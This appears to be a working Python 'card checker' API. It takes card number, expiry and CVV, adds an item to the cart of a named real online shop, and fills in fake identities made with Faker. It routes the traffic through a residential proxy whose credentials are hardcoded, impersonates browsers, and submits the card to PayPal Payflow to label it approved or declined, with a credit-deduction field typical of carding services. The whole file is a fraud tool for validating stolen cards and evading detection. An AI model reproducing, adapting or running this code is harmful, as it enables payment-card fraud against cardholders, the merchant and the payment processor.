from curl_cffi import requests
import hashlib, os, random
from fastapi import FastAPI, Request, APIRouter
from browserforge.headers import HeaderGenerator
from faker import Faker
from bs4 import BeautifulSoup
import traceback

def generate_random_device_id():
    return hashlib.sha256(os.urandom(32)).hexdigest()[:random.randint(8, 36)]


def cap(string: str, start: str, end: str) -> str:
    try:
        str_parts = string.split(start)
        str_parts = str_parts[1].split(end)
        return str_parts[0]
    except IndexError:
        raise None
    
auth_check = APIRouter(prefix="/auth_check")
@auth_check.get("/")
async def tokenize_card(request: Request):

    try:
        lista = request.query_params.get('lista').split('|')
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        cv = lista[3]

        fake = Faker("en_US")
        headers_generator = HeaderGenerator()

        headers = headers_generator.generate(http_version=2)
        form_key = f"{generate_random_device_id()}"
        cookies = {'form_key': form_key,}
        proxy = {
            "http":  "http://resi-hexterlorry:qMMVq6P5SD3agZurqOGO_country-US@mobile.resi.gg:5555",
            "https": "http://resi-hexterlorry:qMMVq6P5SD3agZurqOGO_country-US@mobile.resi.gg:5555"
        }

        giners = [
            'chrome99', 'chrome100', 'chrome101', 'chrome104', 'chrome107',
            'chrome110', 'chrome116', 'chrome119', 'chrome120', 'chrome123',
            'chrome124', 'chrome131', 'chrome99_android', 'chrome131_android',
            'edge99', 'edge101', 'safari15_3', 'safari15_5', 'safari17_0',
            'safari17_2_ios', 'safari18_0', 'safari18_0_ios'
        ]

        # Initialize session
        random_browser = random.choice(giners)

        session = requests.Session(impersonate=random_browser, verify=False)
        session.headers = dict(headers)
        session.proxies.update(proxy)

        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'multipart/form-data; boundary=----geckoformboundary3f37d4e149ff553198332de46bacb2fd',
            'Origin': 'https://www.lathewerks.com',
            'Referer': 'https://www.lathewerks.com/evox-ti-ecu-bracket.html',
            'Priority': 'u=0',
        }
        boundary = "------geckoformboundary3f37d4e149ff553198332de46bacb2fd"
        payload = f"{boundary}\r\nContent-Disposition: form-data; name=\"product\"\r\n\r\n698\r\n{boundary}\r\nContent-Disposition: form-data; name=\"selected_configurable_option\"\r\n\r\n\r\n{boundary}\r\nContent-Disposition: form-data; name=\"related_product\"\r\n\r\n\r\n{boundary}\r\nContent-Disposition: form-data; name=\"item\"\r\n\r\n698\r\n{boundary}\r\nContent-Disposition: form-data; name=\"form_key\"\r\n\r\n{form_key}\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5774]\"\r\n\r\n24686\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5773]\"\r\n\r\n24682\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5775]\"\r\n\r\n24690\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5772]\"\r\n\r\n24680\r\n{boundary}\r\nContent-Disposition: form-data; name=\"qty\"\r\n\r\n1\r\n{boundary}--"

        response = session.post(
            'https://www.lathewerks.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cubGF0aGV3ZXJrcy5jb20vZXZveC10aS1lY3UtYnJhY2tldC5odG1s/product/698/',
            cookies=cookies,
            headers=headers,
            data=payload
        )

        # Get cart and checkout ID:

        headers = {
            'Connection': 'keep-alive',
            'Referer': 'https://www.lathewerks.com/evox-ti-ecu-bracket.html',
            'Priority': 'u=0, i',
        }

        response = session.get('https://www.lathewerks.com/checkout/', cookies=cookies, headers=headers)
        cart_id = cap(response.text, '"entity_id":"','","store_id"')


        # Set shipping/billing:

        headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.lathewerks.com',
                'Connection': 'keep-alive',
                'Referer': 'https://www.lathewerks.com/checkout/',
                'Priority': 'u=0',
            }

        json_data = {
                'addressInformation': {
                    'shipping_address': {
                        'countryId': 'US',
                        'regionId': '43',
                        'regionCode': 'NY',
                        'region': fake.city(),
                        'street': [
                            fake.street_address(),
                            '',
                            '',
                        ],
                        'company': '',
                        'telephone': '3135556666',
                        'postcode': fake.zipcode(),
                        'city': 'NY',
                        'firstname': fake.first_name(),
                        'lastname': fake.last_name(),
                    },
                    'billing_address': {
                        'countryId': 'US',
                        'regionId': '43',
                        'regionCode': 'NY',
                        'region': fake.city(),
                        'street': [
                            fake.street_address(),
                            '',
                            '',
                        ],
                        'company': '',
                        'telephone': '3135556666',
                        'postcode': fake.zipcode(),
                        'city': 'NY',
                        'firstname': fake.first_name(),
                        'lastname': fake.last_name(),
                        'saveInAddressBook': None,
                    },
                    'shipping_method_code': 'freeshipping',
                    'shipping_carrier_code': 'freeshipping',
                    'extension_attributes': {},
                },
            }

        response = session.post(f'https://www.lathewerks.com/rest/default/V1/guest-carts/{cart_id}/shipping-information',headers=headers,json=json_data)

        # Get secure token:

        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.lathewerks.com',
            'Referer': 'https://www.lathewerks.com/checkout/',
        }

        data = [
            ('form_key', form_key),
            ('captcha_form_id', 'payment_processing_request'),
            ('payment[method]', 'payflowpro'),
            ('billing-address-same-as-shipping', 'on'),
            ('captcha_form_id', 'co-payment-form'),
            ('controller', 'checkout_flow'),
            ('cc_type', 'VI'),
        ]

        response = session.post('https://www.lathewerks.com/paypal/transparent/requestSecureToken/',headers=headers,data=data)
        secure_token = response.json()['payflowpro']['fields']['securetoken']
        secure_token_id = response.json()['payflowpro']['fields']['securetokenid']
        # return response.text

        # Make payment:

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.lathewerks.com',
            'Connection': 'keep-alive',
            'Referer': 'https://www.lathewerks.com/',
            'Priority': 'u=0',
        }

        data = {
            'result': '0',
            'securetoken': secure_token,
            'securetokenid': secure_token_id,
            'respmsg': 'Approved',
            'result_code': '0',
            'csc': cv,
            'expdate': f'{mm}{yy[2:]}',
            'acct': cc,
        }

        response = session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        # print(soup)
        tag = soup.find('input', attrs={'name': 'AVSZIP'})
        AVSZIP = tag.get('value') if tag else "U"

        tag = soup.find('input', attrs={'name': 'HOSTCODE'})
        HOSTCODE = tag.get('value') if tag else "None"

        tag = soup.find('input', attrs={'name': 'CVV2MATCH'})
        CVV2MATCH = tag.get('value') if tag else "U"

        tag = soup.find('input', attrs={'name': 'RESPMSG'})
        RESPMSG = tag.get('value') if tag else None

        if RESPMSG == 'Verified: 10574-This card authorization verification is not a payment transaction.':
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Approved ✅",
                "message": f"Approval - 00",
                "cvc/avs": f"{CVV2MATCH}/{AVSZIP}",
                "code": f"{HOSTCODE}",
                "deduct_credits": True}
        elif 'RESPMSG' not in response.text:
            return {
                    "card": f"{cc}|{mm}|{yy}|{cv}",
                    "status": "Unknown ⚠️",
                    "message": "API error",
                    "cvc/avs": f"{CVV2MATCH}/{AVSZIP}",
                    "code": f"{HOSTCODE}",
                    "deduct_credits": False
                    }        
        else:
            return {
                    "card": f"{cc}|{mm}|{yy}|{cv}",
                    "status": "Declined ❌",
                    "message": RESPMSG,
                    "cvc/avs": f"{CVV2MATCH}/{AVSZIP}",
                    "code": f"{HOSTCODE}",
                    "deduct_credits": True
                    } 
    except Exception as e:
        return {
            "card": request.query_params.get('lista', ''),
            "status": "Unknown ⚠️",
            "message": "API error",
            "trace": str(traceback.format_exc()),
        }
